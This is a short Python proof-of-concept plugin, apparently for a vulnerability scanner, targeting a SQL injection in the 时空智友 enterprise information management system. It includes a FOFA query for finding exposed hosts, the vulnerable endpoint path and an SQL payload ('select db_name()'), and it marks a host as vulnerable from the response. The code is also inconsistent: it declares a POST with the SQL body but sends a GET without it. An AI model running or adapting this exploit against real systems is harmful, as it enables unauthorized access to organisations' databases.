#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/iluDHRYq3xGZsvIXug_t_w,https://mp.weixin.qq.com/s/gib4MuJHV89JbdxJNlLjBw',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '时空智友企业信息管理系统sqli',

      'level'     :   'critical',

      'FOFA'      :   'body="时空智友企业信息管理"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',         
      'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',          
      'Accept-Encoding': 'gzip, deflate',          
      'Connection': 'close',          
      'Upgrade-Insecure-Requests': '1',         
      'Content-Length': '50',
      }
  target = '/formservice?service=workflow.sqlResult'
  data = '''
{"params": {"a": "1"}, "sql": "select db_name()"}
  '''
  url1 = url + target
  try:
    res=requests.get(url=url1,headers=headers,timeout=10,verify=False)
    if res.status_code == 200 and re.search(r'xml.*?version=.*?<root>.*?</root>',res.text,re.S):
      # ret['huixian'] = res.text
      res.close()
      ret['url'] = url1
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret